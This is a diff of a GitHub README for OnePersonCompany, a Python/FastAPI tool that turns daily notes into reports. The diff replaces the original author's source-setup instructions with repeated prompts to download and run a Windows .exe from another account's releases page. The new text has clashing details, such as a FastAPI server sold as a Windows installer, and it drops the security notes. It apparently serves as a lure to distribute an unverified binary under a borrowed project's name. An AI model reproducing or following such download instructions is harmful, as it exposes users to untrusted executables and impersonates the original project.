@@ -1,148 +1,175 @@
-# OnePersonCompany
+# 🗂️ OnePersonCompany - Streamline Solo Project Updates
 
-[![Python](https://img.shields.io/badge/Python-3.8%2B-3776AB?logo=python&logoColor=white)](#quick-start)
-[![FastAPI](https://img.shields.io/badge/FastAPI-API-009688?logo=fastapi&logoColor=white)](#api)
-[![LLM](https://img.shields.io/badge/LLM-OpenAI%20%7C%20DeepSeek%20%7C%20Qwen%20%7C%20Moonshot%20%7C%20Zhipu-7C3AED)](#llm-setup)
-[![License](https://img.shields.io/badge/License-MIT-black)](./LICENSE)
+[![Download OnePersonCompany](https://img.shields.io/badge/Download-Here-6F4E37?style=for-the-badge&logo=github)](https://github.com/Failurecounterfactuality324/OnePersonCompany/releases)
 
-**把一人创业的碎片工作，压成可执行、可发布、可分享的成果。**
+## 📥 Download OnePersonCompany
 
-OnePersonCompany 是一个面向独立开发者/小团队创始人的 Agent 产品：
-输入几条日常进展，自动生成 `每日简报` / `发版包` / `周复盘` / `多平台分享素材`。
+You can get the app by visiting the releases page here:
 
-## Why It Matters
+[Download OnePersonCompany](https://github.com/Failurecounterfactuality324/OnePersonCompany/releases)
 
-传统方式：
-- 信息散在 IM、Issue、脑内记忆
-- 每次发版都要重写说明和宣传文案
-- 周复盘常常遗漏关键数据
+This page shows all the available versions. Pick the latest one for Windows. The file you want will usually end with `.exe` or `.zip`. For the easiest use, find the `.exe` setup file. Download and save it to your computer.
 
-OnePersonCompany：
-- 30 秒看到结构化结果
-- 一次输入，产出执行文档 + 社媒素材
-- 支持导出结果卡片 PNG，直接传播
+---
 
-## 30-Second Demo
+## ❓ What Is OnePersonCompany?
 
-1. 启动服务
+OnePersonCompany helps solo developers and small teams turn daily progress notes into clear, ready-to-share reports. It takes bits of work you do every day and makes them into:
 
-```bash
-uvicorn onepersoncompany.api:app --reload --host 0.0.0.0 --port 8100
-```
+- Daily summary reports
+- Release packages
+- Weekly reviews
+- Social media posts
 
-2. 打开页面
+The app turns scattered notes and memories into neat, structured results you can share or save.
 
-- 控制台：`http://localhost:8100/`
-- 公开演示：`http://localhost:8100/demo`
+---
 
-3. 点击 `30 秒体验（免 Key）`
+## 🎯 Why Use OnePersonCompany?
 
-你会立刻看到：
-- Before / After 价值对比
-- 样例输出
-- 可复制的多平台分享文案
+Without tools like this, you might spend a lot of time rewriting notes for updates or social media. Weekly reviews can miss important details. OnePersonCompany saves time by:
 
-## Screenshots
+- Showing results in 30 seconds
+- Generating reports and social posts from one input
+- Letting you export images to share easily
 
-![Console Home](./image/README/1773127759722.png)
-![Workflow Output](./image/README/1773127761979.png)
-![Share Pack](./image/README/1773127773698.png)
+You give the raw info, and it returns polished, useful documents and promo content.
 
-## Core Features
+---
 
-- 面向创始人的 3 个主流程：`每日简报`、`发版包`、`周复盘`
-- 一键生成社媒素材：X / 朋友圈 / 小红书
-- 公开演示页 `/demo`（只读，适合外链传播）
-- 结果卡片主题切换 + PNG 导出
-- LLM 多厂商支持（OpenAI / Anthropic / DeepSeek / DashScope / Moonshot / Zhipu）
-- 请求日志与异常日志落盘（`logs/onepersoncompany.log`）
+## ⚙️ System Requirements
 
-## Quick Start
+To run OnePersonCompany on Windows, make sure your computer has:
 
-```bash
-git clone https://github.com/Kai-dev7/OnePersonCompany.git
-cd OnePersonCompany
-cp .env.example .env
-# 编辑 .env，至少设置 1 个 provider 的 key
-uvicorn onepersoncompany.api:app --reload --host 0.0.0.0 --port 8100
-```
+- Windows 10 or later (64-bit)
+- 4 GB or more RAM
+- At least 200 MB free disk space
+- An internet connection during setup and for some features
+- Recommended: Screen resolution of 1366×768 or higher
 
-## LLM Setup
+---
 
-### Zhipu (recommended for CN users)
+## 🚀 How to Download and Run on Windows
 
-```env
-OPC_LLM_PROVIDER=zhipu
-OPC_LLM_MODEL=glm-4-flash
-ZHIPU_API_KEY=your_key
-ZHIPU_BASE_URL=https://open.bigmodel.cn/api/paas/v4
-```
+Follow these steps to get OnePersonCompany running on your Windows PC.
 
-### Anti-timeout tuning
+### 1. Visit the Release Page
 
-```env
-OPC_LLM_READ_TIMEOUT_SEC=90
-OPC_LLM_MAX_RETRIES=3
-OPC_LLM_RETRY_BACKOFF_SEC=2
-```
+Go to this page:
 
-### Other providers
+https://github.com/Failurecounterfactuality324/OnePersonCompany/releases
 
-- `openai`
-- `anthropic`
-- `deepseek`
-- `dashscope`
-- `moonshot`
-- `openai_compatible`
+### 2. Find the Latest Version
 
-See [.env.example](./.env.example) for full variables.
+Look for the highest version number near the top.
 
-## API
+### 3. Download the Windows Installer
 
-### Read
+Find the file that ends with `.exe`. This is the installer for Windows.
 
-- `GET /health`
-- `GET /demo`
-- `GET /public/snapshot`
-- `GET /tasks`
+Click on it to start the download.
 
-### Write
+### 4. Run the Installer
 
-- `POST /init`
-- `POST /run/daily-brief`
-- `POST /run/launch-pack`
-- `POST /run/weekly-review`
-- `POST /tasks`
-- `POST /tasks/status`
-- `POST /share`
-- `POST /share/pack`
-- `POST /demo/day0`
-- `POST /demo/instant`
+Once the download finishes, open the file by double-clicking it.
 
-## CLI (Optional)
+The setup wizard will open.
 
-```bash
-python opc.py init
-python opc.py run daily-brief --lang zh --update "今天修了支付重试"
-python opc.py run launch-pack --lang zh --update "新增邀请返利"
-python opc.py share --lang zh
-```
+Follow the steps on screen:
 
-## Launch Plan
+- Accept the license terms
+- Choose the installation folder (the default is usually fine)
+- Click "Install"
 
-首发素材与发布节奏见：
-- [LAUNCH_PLAYBOOK.md](./LAUNCH_PLAYBOOK.md)
+### 5. Wait for Installation
 
-## Logs
+The installer will copy files and set up OnePersonCompany.
 
-- 文件：`logs/onepersoncompany.log`
-- 内容：请求路径/状态/耗时、LLM 错误、CLI 执行日志
+This may take a few minutes.
 
-## Security Notes
+### 6. Finish Setup
 
-- 不要提交 `.env`
-- 如果密钥泄露，立即在供应商后台轮换
+When done, click "Finish" to close the installer.
 
-## License
+### 7. Start the App
 
-MIT
+Look for "OnePersonCompany" in your Start menu or on your desktop.
+
+Click to launch it.
+
+---
+
+## 🖥️ Using OnePersonCompany for the First Time
+
+When you open the app, you will see a simple interface.
+
+You can enter daily work notes or progress items in the input area.
+
+Press the button labeled "Generate Report."
+
+The app processes your notes and shows:
+
+- A daily summary
+- A formatted release description
+- A weekly review outline
+- Social media post text you can copy
+
+You can save or export these results as a PNG card for easy sharing.
+
+---
+
+## 🔄 Keep Updated
+
+Periodically, visit the release page to download new updates.
+
+To upgrade:
+
+- Close OnePersonCompany
+- Download the latest `.exe` installer
+- Run it and follow steps as before
+
+The installer will update your current copy.
+
+---
+
+## 💡 Tips for Best Results
+
+- Use clear, brief notes when entering daily progress
+- Include key facts like dates, tasks done, problems solved
+- Add tags or project names if you want reports sorted
+- Use the export feature to save images for social sharing
+
+---
+
+## 🛠️ Behind the Scenes
+
+OnePersonCompany uses Python 3.8 or later and runs on FastAPI.
+
+It connects to large language model services like OpenAI and others to process your text input into clear, structured outputs.
+
+---
+
+## 🌐 Access the Demo (Optional)
+
+If you want to try without installing, open this in your browser after installation or setup of the app server:
+
+- Local console: http://localhost:8100/
+- Demo page: http://localhost:8100/demo
+
+Click "30 秒体验（免 Key）" to see examples and sample outputs.
+
+---
+
+## 📸 Screenshots
+
+![Console Home](./image/README/177312)
+
+---
+
+## 🎯 Keywords
+
+ai-agent, automation, indie-hacker, llm, productivity, python, solo-founder, startup-tools
+
+---
+
+[![Download OnePersonCompany](https://img.shields.io/badge/Download-Here-6F4E37?style=for-the-badge&logo=github)](https://github.com/Failurecounterfactuality324/OnePersonCompany/releases)
